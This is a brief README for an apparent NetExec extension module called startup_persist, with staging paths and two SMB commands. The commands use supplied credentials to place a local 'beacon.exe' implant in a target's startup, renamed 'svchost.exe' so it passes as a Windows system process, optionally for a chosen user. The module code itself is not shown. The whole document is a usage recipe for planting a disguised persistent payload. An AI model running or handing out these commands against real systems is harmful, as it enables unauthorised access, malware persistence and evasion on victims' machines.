# NXC-Extension

Staging
```
Save Python script to:
/home/kali/.nxc/modules/startup_persist.py
/usr/lib/python3/dist-packages/NetExec/nxc/modules/startup_persist.py

```

## Execution
```
nxc smb $IP -u '$username' -p '$password' -M startup_persist -o FILEPATH=/home/kali/Desktop/beacon.exe FILENAME=svchost.exe
  or
nxc smb $IP -u '$username' -p '$password' -M startup_persist -o FILEPATH=/home/kali/Desktop/beacon.exe FILENAME=svchost.exe USER=$user
```
